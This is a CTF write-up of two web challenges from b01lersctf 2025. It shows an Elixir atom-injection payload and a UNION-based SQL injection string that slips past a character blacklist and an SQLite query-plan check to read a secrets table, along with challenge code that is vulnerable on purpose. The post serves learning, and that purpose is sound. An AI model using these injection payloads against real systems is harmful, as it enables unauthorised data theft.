---
title: 'some b01lersctf 2025 writeups'
description: 'some b01lersctf 2025 writeups'
date: 2025-04-20
tags: ['web', 'ctf', 'writeup']
image: './boilers.png'
authors: ['jp']
---

# Background Information
I participated in b01lersctf 2025 with Cosmic Bit Flips. I need to get better at web fr... (lowkey these solves were kinda meaningless lmao)

# Web

## Atom Bomb

> This new atom bomb early warning system is quite strange...

Ok, looking at the frontend we see a button that will tell us the "bomb alerts" with a bunch of random statuses.

![image](./res/atombomb.png)

Ok, so let's do a little source code analysis and try to find the bug. We find a flag function `bomb()`:

```ex
def bomb() do
    flag = case File.read("flag.txt") do
      {:ok, flag} -> flag
      {:error, _} -> "bctf{REDACTED}"
    end

    "The atom bomb detonated, and left in the crater there is a chunk of metal inscribed with #{flag}"
  end
```

There is a weakness with the `atomizer` function:

```
def atomizer(params) when is_binary(params) do
  if String.at(params, 0) == ":" do
    atom_string = String.slice(params, 1..-1//1)
    case string_to_atom(atom_string) do
      {:ok, val} -> val
      :error -> nil
    end
  else
    params
  end
end
```

This allows attackers to create arbitrary atoms from user input if string begins with ":". Atoms can also represent function calls, so we basically need to function call to `bomb()`

Well, when testing I ended up developing a payload that led to a very special error message.

```json
{
  "impact": ":bomb"
}
```

```
{"error":"function :bomb.bomb/0 is undefined (module :bomb is not available)"}
```

:think:. Well, the error tells that the bomb function is undefined since there is no :bomb module, we can just change the payload to the following:

```json
{
  "impact": {
    "bomb": ":Elixir.AtomBomb"
  }
}
```

So basically, what happens is that when it accesses this atom, it will do a function call to bomb, but then throw an exception because it was not expecting string. (ok ngl someone else who solved it can explain it much better lol)

```bash
'key :altitude not found in: "The atom bomb detonated, and left in the crater there is a chunk of metal inscribed with bctf{n0w_w3_ar3_a1l_d3ad_:(_8cd12c17102ac269}\\r\\n"\n\nIf you are using the dot syntax, such as map.field, make sure the left-hand side of the dot is a map'
```

## Defense in Depth

> Instead of making AI slop #7749 and applying to YC, making a security product might be a better play. Layers of defenses

Looking at the frontend we just see a bunch of random text, so let's dig into the source code.

So we see a mysql setup with the flag:

```sql
-- Create database and read-only user
CREATE DATABASE IF NOT EXISTS app_db;
CREATE USER IF NOT EXISTS 'b01lers'@'%' IDENTIFIED BY 'redacted';
GRANT SELECT ON app_db.* TO 'b01lers'@'%';
FLUSH PRIVILEGES;

USE app_db;

-- Create users table
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL UNIQUE
) ENGINE=InnoDB;

-- Create secrets table
CREATE TABLE IF NOT EXISTS secrets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    `key` VARCHAR(255) NOT NULL,
    value TEXT NOT NULL
) ENGINE=InnoDB;

-- Insert sample data
INSERT IGNORE INTO users (name, email) VALUES
    ('neil', 'freshmen@purdue.eduuu'),
    ('gabe', 'boss@retirement.home'),
    ('kevin', 'frontend@kev.in');

INSERT IGNORE INTO secrets (`key`, value) VALUES
    ('junk', 'Wrong turn baby'),
    ('flag', 'bctf{tungtungtungtungtungsahua}');

-- Verify permissions
SHOW GRANTS FOR 'b01lers'@'%';
```

Ok, and we also have main python backend source code that exposes an sql injection vulnerability which is  `query = f"SELECT * from users WHERE name = '{name}'"`

```python
@app.route('/info/<path:name>', methods=['GET'])
def get_user_info(name):
    if len(name) > 100:
        return jsonify({"Message": "Why the long name? Are you Tung Tung Tung Tung Tung Tung Tung Sahua????"}), 403
    try:
        db = get_db()
        cursor = db.cursor()
    except Exception:
        print(traceback.format_exc())
        return jsonify({"Error": "Something very wrong happened, either retry or contact organizers if issue persists!"}), 500
    
    # Verify that the query is good and does not touch the secrets table
    #ok so this query stuff interacts with the sqlite 
    query = f"SELECT * from users WHERE name = '{name}'"
    for item in BLACKLIST:
        if item in query:
            return jsonify({"Message": f"Probably sus"}), 403
    try:
        explain = "EXPLAIN QUERY PLAN " + query
        cursor.execute(explain)
        result = cursor.fetchall()
        if len(result) > 7:
            return jsonify({"Message": "Probably sus"}), 403
        for item in result:
            if "secrets" in item[3]:
                return jsonify({"Message": "I see where you're going..."}), 403
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({"Message": f"Probably sus"}), 403

    # Now let the query through to the real production db
    
    cursor.close()
    # ohhh fetches the first instance?
    try:
        cur = mysql.connection.cursor()
        cur.execute(query)
        records = cur.fetchall()[0]
        cur.close()
        return str(records)
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'Error': "It did not work boss!"}), 400
```

Ok, so we can see it first passes through a bunch of checks before actually being executed and the result being returned to us. The server performs these checks in sqlite3. Here are the checks:

1. If payload is > 100 chars, throw error
2. check if there is any char in blacklist: BLACKLIST = ['(', ')', '-', '#', '%', '+', ';']
3. try EXPLAIN QUERY PLAN our payload, if very complex (len(result) > 7), then throw error. If secrets in the third index of the result, throw error. Finally if the overall EXPLAIN QUERY PLAN fails, also throw error

Finally, if it passes through all these checks, it will open a mysql connection and execute our query and return the result.

Let's craft a sql query that won't throw errors on sqlite3 or mysql and passes all the checks. After some time, I crafted this:

`'OR 1=0 UNION SELECT * FROM secrets AS x WHERE x.key='flag`

And I get the flag:

`(2, 'flag', 'bctf{7h1s_1s_prob4bly_the_easiest_web_s0_go_s0lve_smt_3ls3_n0w!!!}')`